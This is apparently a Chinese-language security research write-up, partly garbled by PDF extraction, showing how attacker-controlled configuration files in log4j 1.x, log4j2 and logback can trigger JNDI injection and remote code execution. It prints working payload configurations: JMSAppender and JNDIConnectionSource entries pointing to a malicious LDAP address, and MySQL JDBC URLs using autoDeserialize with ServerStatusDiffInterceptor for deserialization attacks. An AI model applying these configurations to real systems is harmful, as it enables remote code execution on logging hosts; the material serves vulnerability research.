对 log4j2 漏洞的后续研究中，发现⼀些有趣的东⻄，记录分享⼀下
⾸先提出⼀个问题，log4j 真的在任何情况不存在 JNDI注⼊吗？
答案是否定的。
翻阅 Log4j2 的 pull request 发现⼀个有意思的对话：
有⼈提出实际上 log4j 和 log4j2 ⼀样易受攻击的，只不过与 log4j2 相⽐，Log4j 的攻击向量“更安全”
因为 Log4j 的攻击⼊⼝点是其配置⽂件，⽽ log4j2 的攻击⼊⼝点是⽤户的输⼊
那么实际上如何呢？经过我简单测试，发现修改 log4j 的配置⽂件确实会导致漏洞的产⽣，但要求要⽐pull
reques中所说的更苛刻。
⾸先在 maven 中添加以下依赖：
001 写在前⾯
002 log4j 真的在任何情况不存在 JNDI注⼊吗？
案例1  log4j 配置⽂件中 JMSAppender 的 RCE
        log4j   
        log4j   
        1.2.17   
        org.apache.activemq   
然后在resource ⽬录下新建 log4j.properties ⽂件，内容如下：
最后新建 Log4jJMSAppenderTest.java ⽂件，内容如下：
可以看到，项⽬的所⽤到的主要依赖是 log4j 1.2.17 版本，然后为了满⾜条件要求（后⽂会说具体什么条件），
⼜引⼊了最新版的 activemq 依赖。
然后如果直接运⾏ main 函数，可以直接触发 RCE：
        activemq-broker   
        5.16.3   
log4j.rootLogger=INFO, stdout, jms   
log4j.logger.org.apache.activemq=INFO, stdout   
log4j.appender.stdout=org.apache.log4j.ConsoleAppender   
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout   
log4j.appender.stdout.layout.ConversionPattern=%d %-5p %c - %m%n   
log4j.appender.jms=org.apache.log4j.net.JMSAppender   
log4j.appender.jms.InitialContextFactoryName=org.apache.activemq.jndi.ActiveMQInitia
lContextFactory   
log4j.appender.jms.ProviderURL=tcp://localhost:61616   
log4j.appender.jms.TopicBindingName=jmsTest 
log4j.appender.jms.TopicConnectionFactoryBindingName=ldap://127.0.0.1:1389/erqtcd 
import 
Logger;   
import 
NamingException;   
class Log4jJMSAppenderTest {   
    public static void main(String[] args) throws NamingException {   
        // 通常情况下会⾃动加载 Log4j 的配置⽂件，如果不能⾃动加载可以取消注释下⾏代码   
 // PropertyConfigurator.configure( 
"/Users/panda/Downloads/log4jDemo/src/main/resources/log4j.properties" ); Logger 
logger = Logger.getLogger(Log4jJMSAppenderTest.class);   
        logger.error("error");   
    }   
} 
JAVA
org.apache.log4j.
javax.naming.
原理很简单，log4j 有⼀个名为Appenders的功能，Appender 通常只负责将事件数据写⼊⽬标指定的区域， ⽐
如数据库、JMS 代理等
当检测到 log4j.properties 配置⽂件中存在指定的 Appender 时，会⾃动进⼊相应的功能逻辑
如，假设配置了 log4j.appender.file=org.apache.log4j.FileAppender ，那么会进⼊
FileAppender.java  中的 activateOptions  ⽅法
配置了 log4j.appender.stdout=org.apache.log4j.ConsoleAppender ，那么会进⼊
ConsoleAppender.java  中的 activateOptions ⽅法
上⽂中配置的是 log4j.appender.jms=org.apache.log4j.net.JMSAppender  ，会进⼊ JMSAppender.java
中的 activateOptions ⽅法
我们可以在该⽅法打个断点，debug 就可以看到其调⽤的是 lookup ⽅法：
然后在 ctx.lookup(name) 中传⼊我们指定的恶意 LDAP 服务地址，从⽽触发 RCE
这⾥虽然可以实现了 RCE，但实际上你可以发现，必须要有⼀个⽀持 jms 代理的类
（ org.apache.activemq.jndi.ActiveMQInitialContextFactory ）才可以，否则是会报错的，如果实际
业务代码或引⽤的包中没有 jms 代理类，就显得就⼗分鸡肋+苛刻了
那么可利⽤的仅仅是 JMSAppender 吗？
在 log4j 中，除了 JMSAppender 配置项外，还有很多 Appender，JDBCAppender就是其⼀。
案例 2  log4j 配置⽂件中 JDBC 的 RCE
同样的，在 resources ⽬录下创建 log4j.properties ⽂件，内容如下：
为了⽅便测试 JDBC反序列化漏洞，所以maven 中我们新增了其他依赖，具体如下：
最后再新建 test.java ⽂件，内容如下：
log4j.rootLogger=DEBUG,database  
log4j.appender.database=org.apache.log4j.jdbc.JDBCAppender   
#数据库地址   
log4j.appender.database.URL=jdbc:mysql://127.0.0.1:3306/test?
autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDi
ffInterceptor   
log4j.appender.database.driver=com.mysql.jdbc.Driver   
log4j.appender.database.user=test   
log4j.appender.database.password=111111   
log4j.appender.database.sql=INSERT INTO log4j (message) VALUES('%d{yyyy-MM-dd 
HH:mm:ss} [%5p] - %c - %m%n')   
#log4j.appender.database.layout=org.apache.log4j.PatternLayout   
    log4j   
    log4j   
    1.2.17   
    commons-collections   
    commons-collections   
    3.2.1   
    mysql   
    mysql-connector-java   
    8.0.12   
import 
Logger;   
public class test {   
    public static void main(String[] args) {   
JAVA
org.apache.log4j.
运⾏main函数，直接触发 RCE：
原理和JMSAppender⽐较类似，同样是那么会进⼊ JDBCAppender.java  中，只不过触发的⽅法是
getConnection() ，后续就是我们⽐较熟知的 JDBC 反序列漏洞流程了
这⾥提到的仅仅是 log4j 的1.x 版本，实际上 log4j 2.15.0 同样可以实现上述操作
在能够控制配置⽂件的情况下，可以不⽤再花⼼思去绕过 lookup 的⽩名单和各种限制，直接采⽤类似于上⾯的
⽅式实现 RCE，⽐如三梦师傅之前提到的：
当然，总体来看，这种修改配置⽂件的⽅式还是很鸡肋的，实际利⽤有限，只是适⽤于特殊场景，此处仅作技术
性探讨
提到 log ⽇志记录，除了 log4j 外，还有就是 logback ， logbakc 和 log4j 是 同⼀个⼈写的，因此实际上我想
看看 logback 中是否存在类似问题
        Logger logger = Logger.getLogger(test.class);   
        logger.error("error");   
    }   
} 
%sn. %msg: Class=%class%n%m{lookups} 
${payload} 
003 logback 的鸡肋 RCE
并且由于 logback 是 springboot 的默认组件，如果同样存在类似问题，那么可能遇到这种场景的机会会加⼤
⾸先 看的是 JMSAppender，遗憾的是，在 logback 的 1.2.2版本后，就移除了 JMSTopicAppender
但幸运的是 ，在 logback 中同样存在类似于 JDBCAppender 的 Appender —— DBAppender
DBAppender 中有⼀个名为 ConnectionSource 的接⼝，该接⼝提供了⼀种可插拔式的⽅式为需要使⽤
java.sql.Connection  的 logback 类获取 JDBC 连接，⽬前有三种实现，分别为：
DriverManagerConnectionSource  、 DataSourceConnectionSource 与 JNDIConnectionSource 。这三种
实现每⼀种都可以⽤来实现 RCE。
DriverManagerConnectionSource 和 DataSourceConnectionSource ⽐较类似，都可以通过控制 JDBC 的
URL 去实现 JDBC 反序列化攻击的⽬的。
⾸先在 resource ⽬录下新建 logback-spring.xml ，内容如下
            com.mysql.jdbc.Driver   
            jdbc:mysql://127.0.0.1:3306/test?
autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStat
usDiffInterceptor   
            username   
            password   
然后在新建的 SpringBoot 项⽬的 pom.xml中新加两个依赖，如下：
然后直接运⾏ SpringApplication.run() 所在⽅法，即可触发漏洞：
除上述两种，还有 JNDIConnectionSource ⽅法，JNDIConnectionSource 是 logback ⾃带的⽅法，从名字就
可以看出来，它通过 JNDI 获取 javax.sql.DataSource，然后再获取 java.sql.Connection 实例
同样的，对于我们来说，这种⽅式实现 RCE 更⽅便，完全不需要其他的依赖，测试如下：
    commons-collections   
    commons-collections   
    3.2.1   
    mysql   
    mysql-connector-java   
    8.0.12   
在 resource ⽬录下新建 logback-spring.xml ，内容如下
同样的，直接运⾏ SpringApplication.run() 所在⽅法，即可触发漏洞：
实际上跟踪⼀下可以发现，最终会进⼊到 JNDIConnectionSource.java 的 getConnection ⽅法，如果
dataSource 为空，那么就令 dataSource = lookupDataSource();
然后在lookupDataSource() 中触发 lookup :
            ldap://127.0.0.1:1389/erqtcd   
不过这⾥需要注意的是，JNDIConnectionSource类是通过⽆参构造函数获取
javax.naming.InitialContext ，这种⽅式在 J2EE 环境通常可以⾏得通，但是在 J2EE 环境之外，需要额外
提供⼀个 jndi.properties 的配置⽂件才可以。
实际上除了上述⽅式，还有⼀种配置不借助 DBAppender 也可以直接实现 RCE，配置如下：
运⾏项⽬即可实现 RCE：
同样跟踪可以发现，是在 InsertFromJNDIAction.java 的 begin ⽅法中调⽤了 JNDIUtil.lookup  ⽅法，从
⽽触发漏洞：
当然，还有 JMX 同样可以实现RCE，原理⼤致相同，这⾥不在赘述
上⾯的⽅式确实⽐较鸡肋，正如 pull request 那⾥写的：
如果攻击者可以修改某个系统 S 上的配置⽂件，那么可以假设 S 已经被很⼤程度地渗透了。
但还是有可⾏的场景的， 通过查阅资料我发现，logback配置⽂件中有个特⾊属性为 scan，只要配置⽂件中配置
了 scan  属性，那么系统会启动⼀个scan task监控配置⽂件的变动，如果发⽣变化，那么就在配置⽂件变更时
的⾃动加载新的配置⽂件，具体场景发现已经有⼈做了实验，可以参考：https://xz.aliyun.com/t/7351
当然，可能在绝⼤多数情况下这些⽅式都是没⽤的，但是，请尽情的发挥你的想象，思考可能的攻击场景吧
https://github.com/apache/logging-log4j2/pull/608 
https://activemq.apache.org/how-do-i-use-log4j-jms-appender-with-activemq 
https://logbackcn.gitbook.io/logback/04-di-si-zhang-appenders
004 写在最后
005 参考